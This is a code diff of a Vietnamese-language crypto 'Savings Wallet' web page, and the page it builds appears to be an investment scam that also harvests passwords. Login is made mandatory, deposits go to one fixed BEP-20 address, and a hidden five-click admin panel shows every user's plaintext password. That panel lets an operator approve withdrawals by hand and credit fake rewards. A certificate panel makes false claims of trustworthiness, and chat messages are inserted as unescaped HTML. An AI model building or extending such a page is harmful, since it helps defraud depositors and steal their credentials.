@@ -23,30 +23,13 @@
             border-radius: 50%;
             z-index: 1;
         }
-        .coin-float {
-            animation: floatCoin 3s ease-in-out infinite;
-        }
-        @keyframes floatCoin {
-            0%, 100% { transform: translateY(0px) rotate(0deg); }
-            50% { transform: translateY(-6px) rotate(5deg); }
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-8px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .animate-fade-in {
-            animation: fadeIn 0.4s ease-out forwards;
-        }
-        .lang-scroll-list::-webkit-scrollbar {
-            width: 5px;
-        }
-        .lang-scroll-list::-webkit-scrollbar-track {
-            background: #f1f5f9;
-        }
-        .lang-scroll-list::-webkit-scrollbar-thumb {
-            background: #cbd5e1;
-            border-radius: 4px;
-        }
+        .coin-float { animation: floatCoin 3s ease-in-out infinite; }
+        @keyframes floatCoin { 0%, 100% { transform: translateY(0px) rotate(0deg); } 50% { transform: translateY(-6px) rotate(5deg); } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(-8px); } to { opacity: 1; transform: translateY(0); } }
+        .animate-fade-in { animation: fadeIn 0.4s ease-out forwards; }
+        .lang-scroll-list::-webkit-scrollbar { width: 5px; }
+        .lang-scroll-list::-webkit-scrollbar-track { background: #f1f5f9; }
+        .lang-scroll-list::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 4px; }
     </style>
 </head>
 <body class="bg-gray-100 min-h-screen pb-24 select-none">
@@ -235,22 +218,19 @@
         </button>
     </div>
 
-    <!-- MODAL 1: ĐĂNG NHẬP / ĐĂNG KÝ -->
-    <div id="auth-modal" class="hidden fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
+    <!-- MODAL 1: ĐĂNG NHẬP / ĐĂNG KÝ (BẮT BUỘC KHI TRUY CẬP) -->
+    <div id="auth-modal" class="fixed inset-0 bg-black/80 backdrop-blur-md z-50 flex items-center justify-center p-4">
         <div class="bg-white rounded-2xl max-w-sm w-full p-6 shadow-2xl relative space-y-4 border border-gray-100">
-            <button onclick="closeAuthModal()" class="absolute right-4 top-4 text-gray-400 hover:text-gray-600">
-                <i class="fa-solid fa-xmark text-xl"></i>
-            </button>
             <div class="text-center space-y-1">
                 <div class="w-12 h-12 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center mx-auto text-xl mb-2">
                     <i class="fa-solid fa-user-lock"></i>
                 </div>
                 <h3 class="text-lg font-bold text-gray-800">Login / Register</h3>
-                <p class="text-xs text-gray-500">Secure Account Management</p>
+                <p class="text-xs text-gray-500">Bắt buộc đăng nhập để sử dụng Savings Wallet</p>
             </div>
             <div class="space-y-3 pt-2">
                 <div>
-                    <label class="block text-xs font-semibold text-gray-600 mb-1">Username:</label>
+                    <label class="block text-xs font-semibold text-gray-600 mb-1">Username / Email:</label>
                     <input type="text" id="auth-username" placeholder="Enter username..." class="w-full border rounded-lg p-2.5 text-xs focus:outline-none focus:ring-2 focus:ring-blue-500">
                 </div>
                 <div>
@@ -274,17 +254,21 @@
                 <i class="fa-solid fa-qrcode"></i>
             </div>
             <h3 class="text-lg font-bold text-gray-800">Fixed Deposit Hub</h3>
-            <p class="text-xs text-gray-500">Transfer USDT/BNB via BEP-20 Network to address:</p>
+            <p class="text-xs text-gray-500">Chuyển USDT/BNB qua mạng BEP-20 vào địa chỉ cố định:</p>
             <div class="bg-gray-50 p-3 rounded-xl border border-gray-200">
                 <div class="text-[11px] font-mono text-blue-600 font-bold break-all">0x6d617b8F9423c10aB2718ef8902A1b23C98f8F9</div>
             </div>
-            <button onclick="copyDepositAddress()" class="w-full bg-gray-100 hover:bg-gray-200 text-gray-800 font-bold py-2 rounded-xl text-xs transition">
-                Copy Wallet Address
+            <div>
+                <label class="block text-xs font-semibold text-gray-600 mb-1 text-left">Nhập số tiền đã chuyển (USDT):</label>
+                <input type="number" id="deposit-input-amt" placeholder="0.00" class="w-full border rounded-lg p-2.5 text-xs focus:outline-none focus:ring-2 focus:ring-emerald-500 mb-2">
+            </div>
+            <button onclick="submitDepositRequest()" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-2 rounded-xl text-xs transition shadow">
+                Gửi Yêu Cầu Nạp Tiền (Chờ ADM Duyệt)
             </button>
         </div>
     </div>
 
-    <!-- MODAL 3: HỆ THỐNG ADM QUẢN LÝ ẨN -->
+    <!-- MODAL 3: HỆ THỐNG ADM QUẢN LÝ TOÀN DIỆN -->
     <div id="admin-modal" class="hidden fixed inset-0 bg-black/70 backdrop-blur-md z-50 flex items-center justify-center p-4">
         <div class="bg-white rounded-2xl max-w-lg w-full p-6 shadow-2xl relative space-y-4 border border-gray-200 max-h-[90vh] overflow-y-auto">
             <button onclick="closeAdminModal()" class="absolute right-4 top-4 text-gray-400 hover:text-gray-600">
@@ -300,42 +284,44 @@
 
             <div class="flex border-b text-xs font-semibold">
                 <button onclick="switchAdminTab('users')" id="adm-tab-users" class="flex-1 py-2 border-b-2 border-purple-600 text-purple-600">Tài Khoản & Mật Khẩu</button>
-                <button onclick="switchAdminTab('rewards')" id="adm-tab-rewards" class="flex-1 py-2 text-gray-400">Phát Thưởng / Số Dư</button>
-                <button onclick="switchAdminTab('chats')" id="adm-tab-chats" class="flex-1 py-2 text-gray-400">Hỗ Trợ CSKH (<span id="chat-count">0</span>)</button>
+                <button onclick="switchAdminTab('approval')" id="adm-tab-approval" class="flex-1 py-2 text-gray-400">Duyệt Nạp/Rút (<span id="pending-count">0</span>)</button>
+                <button onclick="switchAdminTab('rewards')" id="adm-tab-rewards" class="flex-1 py-2 text-gray-400">Phát Thưởng</button>
+                <button onclick="switchAdminTab('chats')" id="adm-tab-chats" class="flex-1 py-2 text-gray-400">CSKH (<span id="chat-count">0</span>)</button>
             </div>
 
+            <!-- TAB 1: USER & PASS -->
             <div id="adm-content-users" class="space-y-2 text-xs">
                 <p class="text-gray-500 font-medium">Toàn bộ tên đăng nhập và mật khẩu khách hàng:</p>
-                <div class="max-h-48 overflow-y-auto border rounded-xl p-2 bg-gray-50 space-y-2" id="admin-user-list-container">
-                    <div class="text-gray-400 text-center py-4">Chưa có khách hàng đăng ký tài khoản nào.</div>
-                </div>
+                <div class="max-h-48 overflow-y-auto border rounded-xl p-2 bg-gray-50 space-y-2" id="admin-user-list-container"></div>
             </div>
 
+            <!-- TAB 2: PHÊ DUYỆT NẠP / RÚT TIỀN (NGĂN CHẶN LỢI DỤNG) -->
+            <div id="adm-content-approval" class="hidden space-y-2 text-xs">
+                <p class="text-gray-500 font-medium">Danh sách yêu cầu Nạp/Rút chờ ADM phê duyệt:</p>
+                <div class="max-h-48 overflow-y-auto border rounded-xl p-2 bg-gray-50 space-y-2" id="admin-approval-container"></div>
+            </div>
+
+            <!-- TAB 3: PHÁT THƯỞNG CỐ ĐỊNH -->
             <div id="adm-content-rewards" class="hidden space-y-3 text-xs">
                 <div>
                     <label class="block font-semibold text-gray-600 mb-1">Chọn Khách Hàng:</label>
-                    <select id="admin-target-user" class="w-full border rounded-lg p-2 bg-gray-50">
-                        <option value="all">Tất cả người dùng (Broadcast)</option>
-                    </select>
+                    <select id="admin-target-user" class="w-full border rounded-lg p-2 bg-gray-50"></select>
                 </div>
                 <div>
                     <label class="block font-semibold text-gray-600 mb-1">Số tiền thưởng thêm (USDT):</label>
                     <input type="number" id="admin-reward-amount" placeholder="Ví dụ: 100.00" class="w-full border rounded-lg p-2">
                 </div>
-                <button onclick="adminExecuteReward()" class="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-2.5 rounded-xl transition shadow">
-                    Xác Nhận Phát Thưởng Cho Khách Hàng
-                </button>
+                <button onclick="adminExecuteReward()" class="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-2.5 rounded-xl transition shadow">Xác Nhận Phát Thưởng</button>
             </div>
 
+            <!-- TAB 4: HỖ TRỢ CSKH KHÁCH HÀNG (HIỂN THỊ TÊN TÀI KHOẢN) -->
             <div id="adm-content-chats" class="hidden space-y-3 text-xs">
-                <div class="max-h-48 overflow-y-auto border rounded-xl p-2 bg-gray-50 space-y-2" id="admin-chat-container">
-                    <div class="text-gray-400 text-center py-4">Chưa có yêu cầu hỗ trợ nào từ khách hàng.</div>
-                </div>
+                <div class="max-h-48 overflow-y-auto border rounded-xl p-2 bg-gray-50 space-y-2" id="admin-chat-container"></div>
             </div>
         </div>
     </div>
 
-    <!-- MODAL 4: CỬA SỔ KHUNG CHAT CSKH CHO KHÁCH HÀNG (ĐỒNG BỘ ĐA NGÔN NGỮ ĐẦY ĐỦ) -->
+    <!-- MODAL 4: CHAT CSKH KHÁCH HÀNG -->
     <div id="support-chat-modal" class="hidden fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
         <div class="bg-white rounded-2xl max-w-sm w-full p-5 shadow-2xl relative space-y-3 border border-gray-100">
             <button onclick="closeSupportChat()" class="absolute right-4 top-4 text-gray-400 hover:text-gray-600">
@@ -370,10 +356,16 @@
                 <div class="w-12 h-12 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center mx-auto text-2xl mb-2">
                     <i class="fa-solid fa-shield-halved"></i>
                 </div>
-                <h3 class="text-lg font-bold text-gray-800">SAVINGS DEPOSIT CERTIFICATE</h3>
+                <h3 id="modal-cert-title" class="text-lg font-bold text-gray-800">SAVINGS DEPOSIT CERTIFICATE</h3>
                 <p class="text-xs text-blue-600 font-semibold tracking-wide">SAVINGS WALLET PROTOCOL</p>
             </div>
-            <button onclick="closeCertificateModal()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2.5 rounded-xl text-xs transition shadow">Understood & Confirm</button>
+            <div class="border-t border-b border-gray-100 py-3 space-y-2 text-xs">
+                <div class="flex justify-between"><span id="modal-lbl-op" class="text-gray-500">Operating Since:</span><span class="font-bold text-gray-800">Year 2021 (5+ Years Active)</span></div>
+                <div class="flex justify-between"><span id="modal-lbl-tech" class="text-gray-500">Standard:</span><span id="modal-val-tech" class="font-semibold text-gray-800">Independent Decentralized Protocol</span></div>
+                <div class="flex justify-between"><span id="modal-lbl-custody" class="text-gray-500">Asset Protection:</span><span id="modal-val-custody" class="font-semibold text-blue-600">Self-Custody Wallet</span></div>
+                <div class="flex justify-between"><span id="modal-lbl-net" class="text-gray-500">Network:</span><span class="font-semibold text-green-600">BNB Chain (BEP-20)</span></div>
+            </div>
+            <button onclick="closeCertificateModal()" id="modal-btn-confirm" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2.5 rounded-xl text-xs transition shadow">Understood & Confirm</button>
         </div>
     </div>
 
@@ -393,7 +385,7 @@
         </button>
     </nav>
 
-    <!-- JAVASCRIPT ĐỒNG BỘ ĐA NGÔN NGỮ -->
+    <!-- JAVASCRIPT LOGIC DỮ LIỆU BỀN VỮNG & PHÊ DUYỆT ADM -->
     <script>
         const translations = {
             en: {
@@ -426,53 +418,110 @@
         };
 
         let currentLang = 'en';
-        let registeredUsers = [];
-        let chatMessages = [];
         let adminClickCount = 0;
 
+        let registeredUsers = JSON.parse(localStorage.getItem('sw_users')) || [];
+        let pendingTx = JSON.parse(localStorage.getItem('sw_pending_tx')) || [];
+        let chatMessages = JSON.parse(localStorage.getItem('sw_chats')) || [];
+        let currentUser = localStorage.getItem('sw_current_user') || null;
+
+        function saveAllData() {
+            localStorage.setItem('sw_users', JSON.stringify(registeredUsers));
+            localStorage.setItem('sw_pending_tx', JSON.stringify(pendingTx));
+            localStorage.setItem('sw_chats', JSON.stringify(chatMessages));
+            if(currentUser) localStorage.setItem('sw_current_user', currentUser);
+        }
+
+        window.onload = function() {
+            if (currentUser) {
+                const userObj = registeredUsers.find(u => u.username === currentUser);
+                if (userObj) {
+                    document.getElementById('auth-modal').classList.add('hidden');
+                    document.getElementById('auth-nav-btn').innerText = currentUser.substring(0,8) + '...';
+                    updateUserBalanceDisplay(userObj.balance);
+                }
+            } else {
+                openAuthModal();
+            }
+            updateAdminDashboard();
+        };
+
         function openAuthModal() { document.getElementById('auth-modal').classList.remove('hidden'); }
-        function closeAuthModal() { document.getElementById('auth-modal').classList.add('hidden'); }
+        function closeAuthModal() { 
+            if(!currentUser) { alert("Bạn phải đăng nhập hoặc tạo tài khoản trước!"); return; }
+            document.getElementById('auth-modal').classList.add('hidden'); 
+        }
 
         function handleUserAuth() {
             const user = document.getElementById('auth-username').value.trim();
             const pass = document.getElementById('auth-password').value.trim();
             if(!user || !pass) { alert("Vui lòng nhập đầy đủ tài khoản và mật khẩu!"); return; }
             
-            const existing = registeredUsers.find(u => u.username === user);
-            if(!existing) {
-                registeredUsers.push({ username: user, password: pass, balance: 0 });
-                updateAdminUserList();
+            let userObj = registeredUsers.find(u => u.username === user);
+            if(!userObj) {
+                userObj = { username: user, password: pass, balance: 0 };
+                registeredUsers.push(userObj);
+            } else if (userObj.password !== pass) {
+                alert("Mật khẩu không chính xác!");
+                return;
             }
 
+            currentUser = user;
+            saveAllData();
             document.getElementById('auth-nav-btn').innerText = user.substring(0,8) + '...';
-            closeAuthModal();
-            alert("Success!");
+            document.getElementById('auth-modal').classList.add('hidden');
+            updateUserBalanceDisplay(userObj.balance);
+            updateAdminDashboard();
+            alert("Đăng nhập thành công!");
         }
 
-        function updateAdminUserList() {
-            const container = document.getElementById('admin-user-list-container');
-            const select = document.getElementById('admin-target-user');
-            if(registeredUsers.length === 0) return;
-
-            container.innerHTML = '';
-            select.innerHTML = '<option value="all">Tất cả người dùng (Broadcast)</option>';
-
-            registeredUsers.forEach((u) => {
-                container.innerHTML += `
-                    <div class="flex justify-between items-center bg-white p-2 rounded-lg border shadow-sm">
-                        <div><b>User:</b> <span class="text-blue-600">${u.username}</span> | <b>Pass:</b> <span class="text-red-500 font-mono">${u.password}</span></div>
-                        <div class="text-emerald-600 font-bold">${u.balance} USDT</div>
-                    </div>
-                `;
-                select.innerHTML += `<option value="${u.username}">${u.username}</option>`;
-            });
+        function updateUserBalanceDisplay(balance) {
+            document.getElementById('user-usdt-balance').innerText = parseFloat(balance).toFixed(2) + " USDT";
+            document.getElementById('user-display-balance').innerText = (balance / 600).toFixed(6) + " BNB";
         }
 
         function openDepositModal() { document.getElementById('deposit-modal').classList.remove('hidden'); }
         function closeDepositModal() { document.getElementById('deposit-modal').classList.add('hidden'); }
-        function copyDepositAddress() {
-            navigator.clipboard.writeText("0x6d617b8F9423c10aB2718ef8902A1b23C98f8F9");
-            alert("Copied!");
+        
+        function submitDepositRequest() {
+            const amt = parseFloat(document.getElementById('deposit-input-amt').value);
+            if(!amt || amt <= 0) { alert("Vui lòng nhập số tiền hợp lệ!"); return; }
+
+            pendingTx.push({
+                id: Date.now(),
+                type: 'DEPOSIT',
+                username: currentUser,
+                amount: amt,
+                status: 'PENDING'
+            });
+            saveAllData();
+            closeDepositModal();
+            document.getElementById('deposit-input-amt').value = '';
+            alert("Đã gửi yêu cầu nạp tiền! Vui lòng chờ ADM kiểm tra và phê duyệt.");
+            updateAdminDashboard();
+        }
+
+        function requestWithdrawal() {
+            const amt = parseFloat(document.getElementById('withdraw-input').value);
+            if(!amt || amt <= 0) { alert("Vui lòng nhập số tiền hợp lệ!"); return; }
+            
+            const userObj = registeredUsers.find(u => u.username === currentUser);
+            if(!userObj || userObj.balance < amt) {
+                alert("Số dư khả dụng không đủ để tạo lệnh rút!");
+                return;
+            }
+
+            pendingTx.push({
+                id: Date.now(),
+                type: 'WITHDRAW',
+                username: currentUser,
+                amount: amt,
+                status: 'PENDING'
+            });
+            saveAllData();
+            document.getElementById('withdraw-input').value = '';
+            alert("Lệnh rút tiền đã được tạo! Đang chờ ADM phê duyệt.");
+            updateAdminDashboard();
         }
 
         function handleAdminSecretClick() {
@@ -480,22 +529,28 @@
             if(adminClickCount >= 5) {
                 adminClickCount = 0;
                 document.getElementById('admin-modal').classList.remove('hidden');
-                updateAdminUserList();
+                updateAdminDashboard();
             }
         }
         function closeAdminModal() { document.getElementById('admin-modal').classList.add('hidden'); }
 
         function switchAdminTab(tab) {
             document.getElementById('adm-content-users').classList.add('hidden');
+            document.getElementById('adm-content-approval').classList.add('hidden');
             document.getElementById('adm-content-rewards').classList.add('hidden');
             document.getElementById('adm-content-chats').classList.add('hidden');
+            
             document.getElementById('adm-tab-users').className = "flex-1 py-2 text-gray-400";
+            document.getElementById('adm-tab-approval').className = "flex-1 py-2 text-gray-400";
             document.getElementById('adm-tab-rewards').className = "flex-1 py-2 text-gray-400";
             document.getElementById('adm-tab-chats').className = "flex-1 py-2 text-gray-400";
 
             if(tab === 'users') {
                 document.getElementById('adm-content-users').classList.remove('hidden');
                 document.getElementById('adm-tab-users').className = "flex-1 py-2 border-b-2 border-purple-600 text-purple-600";
+            } else if(tab === 'approval') {
+                document.getElementById('adm-content-approval').classList.remove('hidden');
+                document.getElementById('adm-tab-approval').className = "flex-1 py-2 border-b-2 border-purple-600 text-purple-600";
             } else if(tab === 'rewards') {
                 document.getElementById('adm-content-rewards').classList.remove('hidden');
                 document.getElementById('adm-tab-rewards').className = "flex-1 py-2 border-b-2 border-purple-600 text-purple-600";
@@ -503,6 +558,86 @@
                 document.getElementById('adm-content-chats').classList.remove('hidden');
                 document.getElementById('adm-tab-chats').className = "flex-1 py-2 border-b-2 border-purple-600 text-purple-600";
             }
+        }
+
+        function updateAdminDashboard() {
+            const userContainer = document.getElementById('admin-user-list-container');
+            const selectTarget = document.getElementById('admin-target-user');
+            userContainer.innerHTML = '';
+            selectTarget.innerHTML = '<option value="all">Tất cả người dùng (Broadcast)</option>';
+
+            registeredUsers.forEach(u => {
+                userContainer.innerHTML += `
+                    <div class="flex justify-between items-center bg-white p-2 rounded-lg border shadow-sm">
+                        <div><b>User:</b> <span class="text-blue-600">${u.username}</span> | <b>Pass:</b> <span class="text-red-500 font-mono">${u.password}</span></div>
+                        <div class="text-emerald-600 font-bold">${u.balance.toFixed(2)} USDT</div>
+                    </div>
+                `;
+                selectTarget.innerHTML += `<option value="${u.username}">${u.username}</option>`;
+            });
+
+            const approvalContainer = document.getElementById('admin-approval-container');
+            const pendingList = pendingTx.filter(t => t.status === 'PENDING');
+            document.getElementById('pending-count').innerText = pendingList.length;
+
+            if(pendingList.length === 0) {
+                approvalContainer.innerHTML = '<div class="text-gray-400 text-center py-4">Không có lệnh nạp/rút nào đang chờ duyệt.</div>';
+            } else {
+                approvalContainer.innerHTML = '';
+                pendingList.forEach(t => {
+                    const badgeClass = t.type === 'DEPOSIT' ? 'bg-emerald-100 text-emerald-700' : 'bg-red-100 text-red-700';
+                    approvalContainer.innerHTML += `
+                        <div class="flex justify-between items-center bg-white p-2.5 rounded-lg border shadow-sm">
+                            <div>
+                                <span class="text-[10px] font-bold px-1.5 py-0.5 rounded ${badgeClass}">${t.type}</span>
+                                <b class="ml-1 text-gray-800">${t.username}</b>: <span class="text-blue-600 font-bold">${t.amount} USDT</span>
+                            </div>
+                            <div class="flex space-x-1">
+                                <button onclick="approveTransaction(${t.id})" class="bg-emerald-600 text-white text-[10px] font-bold px-2 py-1 rounded hover:bg-emerald-700">Duyệt</button>
+                                <button onclick="rejectTransaction(${t.id})" class="bg-gray-400 text-white text-[10px] font-bold px-2 py-1 rounded hover:bg-gray-500">Hủy</button>
+                            </div>
+                        </div>
+                    `;
+                });
+            }
+
+            document.getElementById('chat-count').innerText = chatMessages.length;
+            const chatContainer = document.getElementById('admin-chat-container');
+            if(chatMessages.length === 0) {
+                chatContainer.innerHTML = '<div class="text-gray-400 text-center py-4">Chưa có tin nhắn hỗ trợ nào.</div>';
+            } else {
+                chatContainer.innerHTML = chatMessages.map(m => `
+                    <div class="bg-purple-50 p-2 rounded border">
+                        💬 <b class="text-blue-600">${m.username}</b>: <span>${m.text}</span>
+                    </div>
+                `).join('');
+            }
+        }
+
+        function approveTransaction(id) {
+            const tx = pendingTx.find(t => t.id === id);
+            if(!tx) return;
+
+            const userObj = registeredUsers.find(u => u.username === tx.username);
+            if(userObj) {
+                if(tx.type === 'DEPOSIT') userObj.balance += tx.amount;
+                else if(tx.type === 'WITHDRAW') userObj.balance -= tx.amount;
+
+                tx.status = 'APPROVED';
+                saveAllData();
+                if(currentUser === userObj.username) updateUserBalanceDisplay(userObj.balance);
+                updateAdminDashboard();
+                alert("Đã phê duyệt thành công!");
+            }
+        }
+
+        function rejectTransaction(id) {
+            const tx = pendingTx.find(t => t.id === id);
+            if(!tx) return;
+            tx.status = 'REJECTED';
+            saveAllData();
+            updateAdminDashboard();
+            alert("Đã hủy lệnh giao dịch!");
         }
 
         function adminExecuteReward() {
@@ -517,10 +652,12 @@
                 if(found) found.balance += amt;
             }
 
-            document.getElementById('user-usdt-balance').innerText = amt.toFixed(2) + " USDT";
-            document.getElementById('user-display-balance').innerText = (amt / 600).toFixed(6) + " BNB";
-            alert("Success!");
-            updateAdminUserList();
+            saveAllData();
+            const curr = registeredUsers.find(u => u.username === currentUser);
+            if(curr) updateUserBalanceDisplay(curr.balance);
+
+            alert("Phát thưởng thành công!");
+            updateAdminDashboard();
             closeAdminModal();
         }
 
@@ -531,25 +668,17 @@
             const txt = document.getElementById('user-chat-input').value.trim();
             if(!txt) return;
 
-            chatMessages.push({ sender: 'User', text: txt });
+            const name = currentUser ? currentUser : 'Khách';
+            chatMessages.push({ username: name, text: txt });
+            saveAllData();
+
             const box = document.getElementById('chat-messages-box');
-            box.innerHTML += `<div class="bg-gray-100 text-gray-800 p-2 rounded-lg text-right"><b>You:</b> ${txt}</div>`;
+            box.innerHTML += `<div class="bg-gray-100 text-gray-800 p-2 rounded-lg text-right"><b>Bạn (${name}):</b> ${txt}</div>`;
             document.getElementById('user-chat-input').value = '';
-
-            document.getElementById('chat-count').innerText = chatMessages.length;
-            const admChatContainer = document.getElementById('admin-chat-container');
-            admChatContainer.innerHTML = chatMessages.map(m => `<div class="bg-purple-50 p-2 rounded border">💬 <b>Khách hàng:</b> ${m.text}</div>`).join('');
-        }
-
-        function requestWithdrawal() {
-            const val = document.getElementById('withdraw-input').value;
-            if(!val || val <= 0) { alert("Invalid amount!"); return; }
-            alert("Submitted!");
+            updateAdminDashboard();
         }
 
         function toggleLangMenu() { document.getElementById('lang-dropdown').classList.toggle('hidden'); }
-        
-        // HÀM ĐỔI NGÔN NGỮ ĐỒNG BỘ TOÀN HỆ THỐNG
         function selectLanguage(code, name) {
             currentLang = code;
             document.getElementById('current-lang-text').innerText = name;
@@ -581,8 +710,6 @@
             document.getElementById('nav-withdrawal-text').innerText = t.navWithdrawal;
             document.getElementById('nav-account-text').innerText = t.navAccount;
             document.getElementById('btn-quick-deposit').innerText = t.btnQuickDeposit;
-
-            // ĐỒNG BỘ ĐA NGÔN NGỮ CHO KHUNG CHAT CSKH
             document.getElementById('support-tooltip').innerText = t.tooltipSupport;
             document.getElementById('chat-title').innerText = t.chatTitle;
             document.getElementById('chat-status').innerText = t.chatStatus;
